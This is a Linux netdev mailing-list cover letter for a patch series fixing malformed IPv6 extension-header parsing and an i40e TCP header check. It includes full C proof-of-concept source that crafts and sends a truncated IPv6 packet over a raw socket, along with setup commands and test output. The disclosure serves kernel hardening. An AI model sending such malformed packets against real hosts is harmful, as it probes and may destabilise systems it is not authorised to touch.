Received: from mail-qv2-f12.google.com (mail-qv2-f12.google.com [74.125.230.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 236B535B657
	for <netdev@vger.kernel.org>; Sat, 26 Sep 2026 18:23:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.230.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790447005; cv=none; b=QiXnXMtDKNIGZlvkhtsB4AzJTXu5tAo/fwMgiN8bbWy0UyKHaxQxnEasjx//jJedYON9Je78qbFcEfvdxepIttll3suHMSgqqVXjvGIsQQDylhhe9t5OBOkI25SoTljUyd1KgzM6n2TZE9CLc+YN9//EU3yqTXDt91eqsrtNdNg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790447005; c=relaxed/simple;
	bh=uvDSPymvFxF6SlTy3UFZMzZwPuQDdyyTSygEDjU8zPo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GpfgW2grvb3troX5khpr6CbFUcfQtvfi9J87EJ2iG5g/ZFoLZZnAgk/13eN06I+LQ5o1Seur73nfgfuYhWTsZMbA+awVBD/d9EmGJNTt46h+fpNbxn0/WuIOluCelDn4iKalmHoxOY928zPiR7SpI95p+7qfi9zHrw5dkNac7Kg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=V180QLQM; arc=none smtp.client-ip=74.125.230.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="V180QLQM"
Received: by mail-qv2-f12.google.com with SMTP id 6a1803df08f44-90ce6d5271dso10545896d6.1
        for <netdev@vger.kernel.org>; Sat, 26 Sep 2026 11:23:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790447003; x=1791051803; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
        b=V180QLQMOGFc507TwYYhiLB1Br5b88M3WBK3b0v9SzgfYxYqxPvZeD1JPNhcTcrKsi
         VZUEhEdgva1Qf7lho+HoVC/Xv8lAhzy0XIkrSyAnbRgbOamlBPxeWegHSIA0p1T4iuPF
         LtWmPt+g+iQhr+aBHRG2rrBSX4KmmVE3Oeuwinw7LMz3zLGH+iVQoVigta/FhOr0qeMl
         DMmGXlUE9mW4XpxyxL3/UkiHhBON8iJuiWYWr8n+yJQQWOG7WhygfyxGDezKrTVVlsWa
         1EAosp7BQFqwg3FCfLn+psGQiNX6OmB0SWkm8siyL3QMK58itMLp1nwcvZbV68UTB6ts
         TsaA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790447003; x=1791051803;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=kCQtC+BQECPfQicHLZsZ+lH5EE0Cb6sIIYRK2yNnRA8=;
        b=hm3yXWOPE+PZ2LjChBPzDyvnchAbb/qAFKYX/yvgpvMFuyOZR62sM4UYohoAjsJzMP
         fMYZQVLpwHEFR7aFzB1rFU9ZA8rFLg2M8uQKYzaCd+y2R7g0Npsahe81g9hjHBGEaJz+
         dBY/OAT9rvXaq7MbtioEIBPCq/u3VMQ0JfSXGT3H3Yrj4ia9G4m9KUVIgb+NWw6L3jIn
         Hf2/kd6YT5xzAf+JeqX75wTJ6w7P+rAy+JA4/1AbhEdW2oEDbkzXow65ZVosHJyxBvJQ
         T4e4+n1ymZJsBLtyh3dDmEHdEKvvrsqdYYw4km45f8aQOCcQ4JV0mywK9rlLt7as2TYG
         U9lw==
X-Gm-Message-State: AFq9FYKXMTMSwI33E+3vS6/hLtgbKUmpFs4d/ylCMQcEJWZn3y4fTXf2
	hfR0iH9Ju/35Bo+NWLrPPJOvZKoQmWXl5qofGRpGzLUo1ZQNfMj1HaOj9YhFx7d6d8FmfDhctmS
	BMUofy71W
X-Gm-Gg: AYBFou2GQDo0/5ZBbz6TLtWGWZRYJ5rVO/pM9vKZqfK4S0ad/4LGhONAXQWLvvR4nR0
	9/kOzpwLrOty/4Aq73hTzoQlHbgsQzp9yAeiqyoWaH3zUzlE9PE9wv1JWH/l1F2DPceIn9hSgb0
	uZaAupiGdraJJoLq1tlDxidX9HXMKemKm681hZkdnciU4yUswAdUBkc8APgkmJi/M56duRW1aJA
	wYfXa0+f05qhJi98JMKDCJJXOkpMgLIt/r+q7QbaVdz08fdt1ba67bm7lEiCV2dGYGEEZVK38L+
	+5r/nLKGQNSk3B6f3tdNviKLSf5VQ0dyG69XTAWL2WdjEkVPtGechLmpwGs+GA0ELv6HYWf5+8c
	kRPaTKqeB2/4B84YfjVjHFy8Hum8Xo2bxBQy497s9KsAGQr8+LUnZarupaOSMXI+lFHSPaYdcGA
	LzBH+D8tdhM9Js0j0+t1lBtQaQoR8ubFXh49SwcmOqFf7VF8BJM2CUvPGLUH8+fK/ICrrMAtvhO
	xCHWME=
X-Received: by 2002:a05:6214:5005:b0:914:4aa4:4f62 with SMTP id 6a1803df08f44-9144aa4804amr42587326d6.14.1790447002728;
        Sat, 26 Sep 2026 11:23:22 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([202.8.105.119])
        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-91430ec87e3sm43970006d6.47.2026.09.26.11.23.13
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 26 Sep 2026 11:23:22 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	intel-wired-lan@lists.osuosl.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	steffen.klassert@secunet.com,
	herbert@gondor.apana.org.au,
	lucien.xin@gmail.com,
	anthony.l.nguyen@intel.com,
	przemyslaw.kitszel@intel.com,
	jbrandeb@kernel.org,
	sln@onemain.com,
	fw@strlen.de,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net v1 0/2] net: validate malformed IPv6 and TCP headers
Date: Sun, 27 Sep 2026 02:23:07 +0800
Message-ID: <cover.1790082243.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

This series fixes two malformed-packet parsing issues found in the
networking stack. The first is in net/ipv6/exthdrs_core.c: a truncated
IPv6 extension header can make ipv6_skip_exthdr() return an offset past
the end of the skb. The second is in the i40e driver: i40e_atr() can
dereference a TCP header without first checking that the complete header
is present in the skb.

The direct IPv6 reproducer reaches the affected netfilter caller when
run as root and demonstrates the invalid offset. We did not establish
ordinary non-root reachability for this caller. The i40e and XFRM BEET
paths were compile-checked and reviewed, but were not runtime-tested
because the QEMU guests did not provide the required hardware or
offload device.

We've tested the IPv6 changes in clean and patched QEMU guests. Complete
extension headers and the tested IPv6 reassembly behavior remain intact.

We will provide detailed information about the bug in this email,
along with the complete PoC source.

---- details below ----

Bug details:

Patch 1 fixes the IPv6 parser. ipv6_skip_exthdr() derives the
extension-header length from hdrlen and advances the offset without
first checking that the complete header is present in the skb. A
truncated Destination Options header can therefore make it return an
offset past skb->len.

The fix rejects the header when its calculated length exceeds the
remaining skb data, before reading the next-header value or advancing
the offset. Consumers that use the returned offset now handle -1 as a
malformed packet: IPv6 fragment reassembly rejects a malformed first
fragment, ICMPv6 does not send an error reply, and XFRM BEET GSO aborts
before updating the transport offset. Complete extension headers retain
their existing behavior.

Patch 2 fixes a separate length check in i40e_atr(). ipv6_find_hdr()
can identify TCP as the next protocol without proving that a complete
struct tcphdr is present. The patch checks the remaining skb data before
i40e_atr() inspects TCP flags.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ip link add veth0 type veth peer name veth1
    ip link set dev veth0 address 52:36:9e:3a:43:2d
    ip link set dev veth1 address 02:00:00:00:00:02
    ip -6 addr add 2001:db8:5252::1/64 dev veth0
    ip link set veth0 up
    ip link set veth1 up
    nft add table ip6 caller_probe
    nft add chain ip6 caller_probe input \
        '{ type filter hook input priority 0; policy accept; }'
    nft add rule ip6 caller_probe input iifname veth0 \
        counter reject with icmpv6 type port-unreachable

The commands above require root privileges and were run directly in an
x86 QEMU guest with 2 vCPUs and 2 GB of RAM.

For the packet-level observation, we temporarily added the following
debug print in nf_reject_v6_csum_ok(), immediately after its
ipv6_skip_exthdr() call in net/ipv6/netfilter/nf_reject_ipv6.c:

    pr_info("skip caller=reject6_csum offset=%d skb_len=%u proto=%u\n",
            thoff, skb->len, proto);

The temporary change was not included in the submitted patch. On each
kernel, we cleared the log, ran poc directly, and checked the result
with:

    dmesg -C
    ./poc veth1 52:36:9e:3a:43:2d 2001:db8:5252::1
    poc_rc=$?
    echo "poc_rc=$poc_rc"
    dmesg | grep 'skip caller=reject6_csum'
    nft list chain ip6 caller_probe input

Additional validation:

The direct helper and consumer probe ran in matching clean and patched
QEMU guests as root. All 25 assertions passed in both guests. The key
Destination Options case declared a 2048-byte header while only 8 bytes
were available:

- clean: ipv6_skip_exthdr() returned offset 2048
- patched: ipv6_skip_exthdr() returned -1

The shared fragment consumer likewise returned false on the clean kernel
and true on the patched kernel for a truncated extension header. The
packet-level runner completed with expanded_poc=PASS on both kernels,
and the final fault scan found no BUG, Oops, KASAN report, panic, or
soft-lockup. These tests establish behavior in root QEMU guests only;
they do not prove non-root or user-namespace reachability.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ipv6.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static int parse_mac(const char *text, unsigned char *mac)
{
	unsigned int values[ETH_ALEN];

	if (sscanf(text, "%x:%x:%x:%x:%x:%x",
		   &values[0], &values[1], &values[2], &values[3],
		   &values[4], &values[5]) != ETH_ALEN)
		return -1;

	for (size_t index = 0; index < ETH_ALEN; index++) {
		if (values[index] > 0xff)
			return -1;
		mac[index] = (unsigned char)values[index];
	}

	return 0;
}

static int get_interface_mac(const char *interface, unsigned char *mac)
{
	struct ifreq request;
	int socket_fd;
	int result;

	socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (socket_fd < 0)
		return -1;

	memset(&request, 0, sizeof(request));
	strncpy(request.ifr_name, interface, IFNAMSIZ - 1);
	result = ioctl(socket_fd, SIOCGIFHWADDR, &request);
	if (result == 0)
		memcpy(mac, request.ifr_hwaddr.sa_data, ETH_ALEN);
	close(socket_fd);
	return result;
}

static void print_usage(const char *program)
{
	fprintf(stderr,
		"usage: %s <interface> <destination-mac> <destination-ipv6>\n",
		program);
}

int main(int argc, char **argv)
{
	unsigned char source_mac[ETH_ALEN];
	unsigned char destination_mac[ETH_ALEN];
	unsigned char frame[ETH_HLEN + sizeof(struct ipv6hdr) + 8];
	struct ipv6hdr *ip6;
	struct sockaddr_ll address;
	struct in6_addr destination;
	const char *interface;
	int socket_fd;
	int interface_index;
	ssize_t sent;
	unsigned int hdrlen = 255;

	if (argc != 4) {
		print_usage(argv[0]);
		return 2;
	}

	interface = argv[1];
	if (parse_mac(argv[2], destination_mac) < 0) {
		fprintf(stderr, "invalid destination MAC: %s\n", argv[2]);
		return 2;
	}
	if (inet_pton(AF_INET6, argv[3], &destination) != 1) {
		fprintf(stderr, "invalid destination IPv6 address: %s\n", argv[3]);
		return 2;
	}
	if (get_interface_mac(interface, source_mac) < 0) {
		perror("SIOCGIFHWADDR");
		return 1;
	}

	interface_index = (int)if_nametoindex(interface);
	if (interface_index == 0) {
		perror("if_nametoindex");
		return 1;
	}

	memset(frame, 0, sizeof(frame));
	memcpy(frame, destination_mac, ETH_ALEN);
	memcpy(frame + ETH_ALEN, source_mac, ETH_ALEN);
	frame[12] = ETH_P_IPV6 >> 8;
	frame[13] = ETH_P_IPV6 & 0xff;

	ip6 = (struct ipv6hdr *)(frame + ETH_HLEN);
	ip6->version = 6;
	ip6->payload_len = htons(8);
	ip6->nexthdr = IPPROTO_DSTOPTS;
	ip6->hop_limit = 64;
	inet_pton(AF_INET6, "2001:db8:5252::2", &ip6->saddr);
	ip6->daddr = destination;

	frame[ETH_HLEN + sizeof(struct ipv6hdr)] = IPPROTO_TCP;
	frame[ETH_HLEN + sizeof(struct ipv6hdr) + 1] = hdrlen;

	socket_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
	if (socket_fd < 0) {
		perror("AF_PACKET/SOCK_RAW");
		return 1;
	}

	memset(&address, 0, sizeof(address));
	address.sll_family = AF_PACKET;
	address.sll_protocol = htons(ETH_P_IPV6);
	address.sll_ifindex = interface_index;
	address.sll_halen = ETH_ALEN;
	memcpy(address.sll_addr, destination_mac, ETH_ALEN);

	sent = sendto(socket_fd, frame, sizeof(frame), 0,
		      (struct sockaddr *)&address, sizeof(address));
	if (sent < 0) {
		perror("sendto");
		close(socket_fd);
		printf("send_rc=-1 errno=%d\n", errno);
		return 1;
	}

	printf("send_rc=%zd\n", sent);
	close(socket_fd);
	return sent == (ssize_t)sizeof(frame) ? 0 : 1;
}
------END poc.c--------

----BEGIN test output----

send_rc=62
poc_rc=0
[  456.953986] skip caller=reject6_csum offset=2088 skb_len=48 proto=6
table ip6 caller_probe {
        chain input {
                type filter hook input priority filter; policy accept;
                iifname "veth0" counter packets 1 bytes 48 reject
	}
}

----END test output----

Zixuan Chai (2):
  ipv6: reject truncated extension headers in ipv6_skip_exthdr()
  i40e: validate TCP header before ATR access

---
 drivers/net/ethernet/intel/i40e/i40e_txrx.c |  3 +++
 include/net/ipv6_frag.h                     |  4 +++-
 net/ipv4/esp4_offload.c                     |  8 ++++++--
 net/ipv6/esp6_offload.c                     |  8 ++++++--
 net/ipv6/exthdrs_core.c                     | 14 +++++++-------
 net/ipv6/icmp.c                             |  2 +-
 6 files changed, 26 insertions(+), 13 deletions(-)

-- 
2.34.1
